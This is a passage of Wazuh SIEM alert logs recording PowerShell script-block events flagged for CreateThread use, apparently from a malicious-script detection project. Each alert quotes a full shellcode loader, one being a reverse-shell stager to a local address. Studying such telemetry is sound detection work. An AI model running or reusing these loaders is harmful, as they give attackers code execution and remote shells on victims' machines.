{"timestamp":"2026-07-06T02:20:42.898+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":157,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304442.3508916","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:03.3947966Z","eventRecordID":"145496","processID":"1720","threadID":"3272","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$PFOW = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $PFOW -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd1,0xb8,0xc8,0x0b,0x1b,0xc8,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x6e,0x31,0x43,0x19,0x83,0xc3,0x04,0x03,0x43,0x15,0x2a,0xfe,0xe7,0x20,0x23,0x01,0x18,0xb1,0x53,0x8b,0xfd,0x80,0x41,0xef,0x76,0xb0,0x55,0x7b,0xda,0x39,0x1e,0x29,0xcf,0xca,0x52,0xe6,0xe0,0x7b,0xd8,0xd0,0xcf,0x7c,0xed,0xdc,0x9c,0xbf,0x6c,0xa1,0xde,0x93,0x4e,0x98,0x10,0xe6,0x8f,0xdd,0x4d,0x09,0xdd,0xb6,0x1a,0xb8,0xf1,0xb3,0x5f,0x01,0xf0,0x13,0xd4,0x39,0x8a,0x16,0x2b,0xcd,0x20,0x18,0x7c,0x7e,0x3f,0x52,0x64,0xf4,0x67,0x43,0x95,0xd9,0x74,0xbf,0xdc,0x56,0x4e,0x4b,0xdf,0xbe,0x9f,0xb4,0xd1,0xfe,0x73,0x8b,0xdd,0xf2,0x8a,0xcb,0xda,0xec,0xf9,0x27,0x19,0x90,0xf9,0xf3,0x63,0x4e,0x8c,0xe1,0xc4,0x05,0x36,0xc2,0xf5,0xca,0xa0,0x81,0xfa,0xa7,0xa7,0xce,0x1e,0x39,0x64,0x65,0x1a,0xb2,0x8b,0xaa,0xaa,0x80,0xaf,0x6e,0xf6,0x53,0xce,0x37,0x52,0x35,0xef,0x28,0x3a,0xea,0x55,0x22,0xa9,0xff,0xef,0x69,0xa6,0x91,0x8a,0xe5,0x36,0x06,0x23,0x6f,0x59,0xbf,0x42,0x89,0xf1,0x57,0x18,0x21,0xdc,0xa0,0x5f,0x18,0x11,0x50,0xc8,0xf4,0x05,0xf9,0xa0,0x92,0x93,0x53,0x35,0xc4,0x1b,0x8e,0x2e,0x69,0xbf,0x00,0x79,0x3f,0x6e,0x09,0x7a,0x91,0xc1,0xa5,0xc7,0x10,0xe2,0x35,0x64,0x43,0x8a,0x62,0x03,0xfc,0x8c,0x72,0xc6,0xe8,0x5e,0xd4,0xd9,0x3c,0x32,0x8e,0x19,0xf3,0x13,0xca,0x4b,0xa1,0x01,0x82,0x39,0x15,0xce,0xcf,0xe8,0xbb,0x35,0xef,0xc7,0x4d,0x8f,0x65,0xf7,0x16,0x78,0xfa,0xc4,0xa8,0x78,0x73,0xca,0xc3,0x7c,0xd3,0x60,0x0b,0x2b,0xbb,0x01,0x75,0x4d,0xbd,0x16,0xac,0x40,0x3d,0xbf,0x18,0xf4,0x96,0x69,0xcf,0xd7,0x1e,0x8d,0x74,0xd7,0xca,0x28,0x4a,0x52,0xea,0x79,0x44,0x19,0x68,0x7d,0x5a,0x21,0x7a,0xac,0xb3,0xab,0x7c,0x4e,0x44,0x44,0xd0,0xb1,0xbb,0x6b,0x06,0x37,0x35,0xf6,0x2c,0xb3,0xd8,0xd8,0xab,0x43,0x46,0x25,0xdf,0xd8,0xb9,0xe5,0x40,0x4e,0xd0,0xe7,0x14,0x6c,0x74,0x82,0xea,0x1a,0x76,0x05,0x83,0x00,0x80,0x73,0x1c,0x4b,0xb8,0x17,0x92,0x73,0x25,0xa0,0xd1,0x70,0x83,0x14,0x8d,0xfb,0x9f,0xb0,0x26,0x32,0xe0,0x0d,0x35,0x64,0xb1,0x3b,0x52,0x96,0xa7,0x4d,0x40,0x69,0x12,0xc8,0x45,0xe1,0xb0,0x8b,0xc0,0xc9,0xbf,0x3d,0xa1,0xc9,0x6b,0x12,0xb8,0x8d,0xb7,0x9e,0x92,0x5e,0xd0,0xb3,0x45,0xce,0x7b,0x33,0xbc,0x8d,0x90,0xcf,0xd4,0x5f,0x3b,0xb8,0xec,0xc9,0x3b,0x6a,0x0e,0x20,0x29,0x8b,0xa7,0xa2,0x9f,0x00,0x28,0xb5,0x1f,0xc3,0xdd,0xb9,0xb7,0x1c,0x94,0x1b,0x11,0x22,0x02,0xb3,0x0e,0x23,0x52,0xbc,0x51,0xf8,0x83,0x27,0xd6,0x65,0xdc,0x4f,0x2f,0x99,0x23,0x70,0x51,0x4b,0xac,0xe1,0xff,0xf5,0x62,0x9e,0x9e,0x8d,0x7a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$lb6=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($lb6.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$lb6,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 046ea0c9-3497-4030-9dea-0136b9546acc\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3026.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$PFOW = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $PFOW -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd1,0xb8,0xc8,0x0b,0x1b,0xc8,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x6e,0x31,0x43,0x19,0x83,0xc3,0x04,0x03,0x43,0x15,0x2a,0xfe,0xe7,0x20,0x23,0x01,0x18,0xb1,0x53,0x8b,0xfd,0x80,0x41,0xef,0x76,0xb0,0x55,0x7b,0xda,0x39,0x1e,0x29,0xcf,0xca,0x52,0xe6,0xe0,0x7b,0xd8,0xd0,0xcf,0x7c,0xed,0xdc,0x9c,0xbf,0x6c,0xa1,0xde,0x93,0x4e,0x98,0x10,0xe6,0x8f,0xdd,0x4d,0x09,0xdd,0xb6,0x1a,0xb8,0xf1,0xb3,0x5f,0x01,0xf0,0x13,0xd4,0x39,0x8a,0x16,0x2b,0xcd,0x20,0x18,0x7c,0x7e,0x3f,0x52,0x64,0xf4,0x67,0x43,0x95,0xd9,0x74,0xbf,0xdc,0x56,0x4e,0x4b,0xdf,0xbe,0x9f,0xb4,0xd1,0xfe,0x73,0x8b,0xdd,0xf2,0x8a,0xcb,0xda,0xec,0xf9,0x27,0x19,0x90,0xf9,0xf3,0x63,0x4e,0x8c,0xe1,0xc4,0x05,0x36,0xc2,0xf5,0xca,0xa0,0x81,0xfa,0xa7,0xa7,0xce,0x1e,0x39,0x64,0x65,0x1a,0xb2,0x8b,0xaa,0xaa,0x80,0xaf,0x6e,0xf6,0x53,0xce,0x37,0x52,0x35,0xef,0x28,0x3a,0xea,0x55,0x22,0xa9,0xff,0xef,0x69,0xa6,0x91,0x8a,0xe5,0x36,0x06,0x23,0x6f,0x59,0xbf,0x42,0x89,0xf1,0x57,0x18,0x21,0xdc,0xa0,0x5f,0x18,0x11,0x50,0xc8,0xf4,0x05,0xf9,0xa0,0x92,0x93,0x53,0x35,0xc4,0x1b,0x8e,0x2e,0x69,0xbf,0x00,0x79,0x3f,0x6e,0x09,0x7a,0x91,0xc1,0xa5,0xc7,0x10,0xe2,0x35,0x64,0x43,0x8a,0x62,0x03,0xfc,0x8c,0x72,0xc6,0xe8,0x5e,0xd4,0xd9,0x3c,0x32,0x8e,0x19,0xf3,0x13,0xca,0x4b,0xa1,0x01,0x82,0x39,0x15,0xce,0xcf,0xe8,0xbb,0x35,0xef,0xc7,0x4d,0x8f,0x65,0xf7,0x16,0x78,0xfa,0xc4,0xa8,0x78,0x73,0xca,0xc3,0x7c,0xd3,0x60,0x0b,0x2b,0xbb,0x01,0x75,0x4d,0xbd,0x16,0xac,0x40,0x3d,0xbf,0x18,0xf4,0x96,0x69,0xcf,0xd7,0x1e,0x8d,0x74,0xd7,0xca,0x28,0x4a,0x52,0xea,0x79,0x44,0x19,0x68,0x7d,0x5a,0x21,0x7a,0xac,0xb3,0xab,0x7c,0x4e,0x44,0x44,0xd0,0xb1,0xbb,0x6b,0x06,0x37,0x35,0xf6,0x2c,0xb3,0xd8,0xd8,0xab,0x43,0x46,0x25,0xdf,0xd8,0xb9,0xe5,0x40,0x4e,0xd0,0xe7,0x14,0x6c,0x74,0x82,0xea,0x1a,0x76,0x05,0x83,0x00,0x80,0x73,0x1c,0x4b,0xb8,0x17,0x92,0x73,0x25,0xa0,0xd1,0x70,0x83,0x14,0x8d,0xfb,0x9f,0xb0,0x26,0x32,0xe0,0x0d,0x35,0x64,0xb1,0x3b,0x52,0x96,0xa7,0x4d,0x40,0x69,0x12,0xc8,0x45,0xe1,0xb0,0x8b,0xc0,0xc9,0xbf,0x3d,0xa1,0xc9,0x6b,0x12,0xb8,0x8d,0xb7,0x9e,0x92,0x5e,0xd0,0xb3,0x45,0xce,0x7b,0x33,0xbc,0x8d,0x90,0xcf,0xd4,0x5f,0x3b,0xb8,0xec,0xc9,0x3b,0x6a,0x0e,0x20,0x29,0x8b,0xa7,0xa2,0x9f,0x00,0x28,0xb5,0x1f,0xc3,0xdd,0xb9,0xb7,0x1c,0x94,0x1b,0x11,0x22,0x02,0xb3,0x0e,0x23,0x52,0xbc,0x51,0xf8,0x83,0x27,0xd6,0x65,0xdc,0x4f,0x2f,0x99,0x23,0x70,0x51,0x4b,0xac,0xe1,0xff,0xf5,0x62,0x9e,0x9e,0x8d,0x7a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$lb6=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($lb6.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$lb6,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"046ea0c9-3497-4030-9dea-0136b9546acc","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3026.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:44.215+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":158,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304444.3523413","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:04.1560031Z","eventRecordID":"145500","processID":"8344","threadID":"3556","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0xd8,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 1998bdef-0b28-466b-a34a-8decea14d88e\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3030.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0xd8,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"1998bdef-0b28-466b-a34a-8decea14d88e","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3030.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:45.206+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":159,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304445.3534362","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:05.0134700Z","eventRecordID":"145504","processID":"5940","threadID":"5504","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$JsKO = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $JsKO -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc4,0xba,0xb3,0xfd,0xec,0x2b,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x56,0x18,0x83,0xc6,0x04,0x03,0x56,0xa7,0x1f,0x19,0xd7,0x2f,0x5d,0xe2,0x28,0xaf,0x02,0x6a,0xcd,0x9e,0x02,0x08,0x85,0xb0,0xb2,0x5a,0xcb,0x3c,0x38,0x0e,0xf8,0xb7,0x4c,0x87,0x0f,0x70,0xfa,0xf1,0x3e,0x81,0x57,0xc1,0x21,0x01,0xaa,0x16,0x82,0x38,0x65,0x6b,0xc3,0x7d,0x98,0x86,0x91,0xd6,0xd6,0x35,0x06,0x53,0xa2,0x85,0xad,0x2f,0x22,0x8e,0x52,0xe7,0x45,0xbf,0xc4,0x7c,0x1c,0x1f,0xe6,0x51,0x14,0x16,0xf0,0xb6,0x11,0xe0,0x8b,0x0c,0xed,0xf3,0x5d,0x5d,0x0e,0x5f,0xa0,0x52,0xfd,0xa1,0xe4,0x54,0x1e,0xd4,0x1c,0xa7,0xa3,0xef,0xda,0xda,0x7f,0x65,0xf9,0x7c,0x0b,0xdd,0x25,0x7d,0xd8,0xb8,0xae,0x71,0x95,0xcf,0xe9,0x95,0x28,0x03,0x82,0xa1,0xa1,0xa2,0x45,0x20,0xf1,0x80,0x41,0x69,0xa1,0xa9,0xd0,0xd7,0x04,0xd5,0x03,0xb8,0xf9,0x73,0x4f,0x54,0xed,0x09,0x12,0x30,0xc2,0x23,0xad,0xc0,0x4c,0x33,0xde,0xf2,0xd3,0xef,0x48,0xbe,0x9c,0x29,0x8e,0xc1,0xb6,0x8e,0x00,0x3c,0x39,0xef,0x09,0xfa,0x6d,0xbf,0x21,0x2b,0x0e,0x54,0xb2,0xd4,0xdb,0xc1,0xb7,0x42,0x24,0xbd,0xc7,0x12,0xcc,0xbc,0x37,0x13,0xb6,0x48,0xd1,0x43,0x98,0x1a,0x4e,0x23,0x48,0xdb,0x3e,0xcb,0x82,0xd4,0x61,0xeb,0xac,0x3e,0x0a,0x81,0x42,0x97,0x62,0x3d,0xfa,0xb2,0xf9,0xdc,0x03,0x69,0x84,0xde,0x88,0x9e,0x78,0x90,0x78,0xea,0x6a,0x44,0x89,0xa1,0xd1,0xc2,0x96,0x1f,0x7f,0xea,0x02,0xa4,0xd6,0xbd,0xba,0xa6,0x0f,0x89,0x64,0x58,0x7a,0x82,0xad,0xcc,0xc5,0xfc,0xd1,0x00,0xc6,0xfc,0x87,0x4a,0xc6,0x94,0x7f,0x2f,0x95,0x81,0x7f,0xfa,0x89,0x1a,0xea,0x05,0xf8,0xcf,0xbd,0x6d,0x06,0x36,0x89,0x31,0xf9,0x1d,0x0b,0x0d,0x2c,0x5b,0x79,0x7f,0xec;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$4Psu=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($4Psu.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$4Psu,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: fba9e252-51e8-4d40-926d-7ca85362d4ec\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\304.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$JsKO = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $JsKO -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc4,0xba,0xb3,0xfd,0xec,0x2b,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x31,0x56,0x18,0x83,0xc6,0x04,0x03,0x56,0xa7,0x1f,0x19,0xd7,0x2f,0x5d,0xe2,0x28,0xaf,0x02,0x6a,0xcd,0x9e,0x02,0x08,0x85,0xb0,0xb2,0x5a,0xcb,0x3c,0x38,0x0e,0xf8,0xb7,0x4c,0x87,0x0f,0x70,0xfa,0xf1,0x3e,0x81,0x57,0xc1,0x21,0x01,0xaa,0x16,0x82,0x38,0x65,0x6b,0xc3,0x7d,0x98,0x86,0x91,0xd6,0xd6,0x35,0x06,0x53,0xa2,0x85,0xad,0x2f,0x22,0x8e,0x52,0xe7,0x45,0xbf,0xc4,0x7c,0x1c,0x1f,0xe6,0x51,0x14,0x16,0xf0,0xb6,0x11,0xe0,0x8b,0x0c,0xed,0xf3,0x5d,0x5d,0x0e,0x5f,0xa0,0x52,0xfd,0xa1,0xe4,0x54,0x1e,0xd4,0x1c,0xa7,0xa3,0xef,0xda,0xda,0x7f,0x65,0xf9,0x7c,0x0b,0xdd,0x25,0x7d,0xd8,0xb8,0xae,0x71,0x95,0xcf,0xe9,0x95,0x28,0x03,0x82,0xa1,0xa1,0xa2,0x45,0x20,0xf1,0x80,0x41,0x69,0xa1,0xa9,0xd0,0xd7,0x04,0xd5,0x03,0xb8,0xf9,0x73,0x4f,0x54,0xed,0x09,0x12,0x30,0xc2,0x23,0xad,0xc0,0x4c,0x33,0xde,0xf2,0xd3,0xef,0x48,0xbe,0x9c,0x29,0x8e,0xc1,0xb6,0x8e,0x00,0x3c,0x39,0xef,0x09,0xfa,0x6d,0xbf,0x21,0x2b,0x0e,0x54,0xb2,0xd4,0xdb,0xc1,0xb7,0x42,0x24,0xbd,0xc7,0x12,0xcc,0xbc,0x37,0x13,0xb6,0x48,0xd1,0x43,0x98,0x1a,0x4e,0x23,0x48,0xdb,0x3e,0xcb,0x82,0xd4,0x61,0xeb,0xac,0x3e,0x0a,0x81,0x42,0x97,0x62,0x3d,0xfa,0xb2,0xf9,0xdc,0x03,0x69,0x84,0xde,0x88,0x9e,0x78,0x90,0x78,0xea,0x6a,0x44,0x89,0xa1,0xd1,0xc2,0x96,0x1f,0x7f,0xea,0x02,0xa4,0xd6,0xbd,0xba,0xa6,0x0f,0x89,0x64,0x58,0x7a,0x82,0xad,0xcc,0xc5,0xfc,0xd1,0x00,0xc6,0xfc,0x87,0x4a,0xc6,0x94,0x7f,0x2f,0x95,0x81,0x7f,0xfa,0x89,0x1a,0xea,0x05,0xf8,0xcf,0xbd,0x6d,0x06,0x36,0x89,0x31,0xf9,0x1d,0x0b,0x0d,0x2c,0x5b,0x79,0x7f,0xec;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$4Psu=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($4Psu.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$4Psu,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"fba9e252-51e8-4d40-926d-7ca85362d4ec","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\304.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:45.317+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":160,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304445.3545727","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:05.7736553Z","eventRecordID":"145508","processID":"1892","threadID":"4440","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint 